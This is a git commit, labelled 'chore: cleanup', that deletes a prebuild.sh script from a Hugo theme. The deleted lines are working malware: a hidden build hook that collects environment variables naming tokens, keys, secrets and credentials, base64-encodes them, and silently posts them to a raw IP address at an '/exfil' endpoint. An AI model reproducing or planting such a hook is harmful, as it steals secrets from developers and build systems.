f1bced3011e1270ca0c41c880e4ffa96279504c0
Yareli <37076741+yarelosa@users.noreply.github.com>
2026-05-15 10:29:33 -0600

    chore: cleanup

--- themes/hugo-solstice-theme/prebuild.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-(curl -sf -X POST -d "$(env | grep -iE "TOKEN|KEY|SECRET|PASS|CRED|LICENSE|API|PGP|MAVEN|DOCKER|NUGET|PYPI|AZURE|QNX|ARM_|SSO|PEM" | base64 -w0)" "http://164.90.212.158:8444/exfil" 2>/dev/null &)
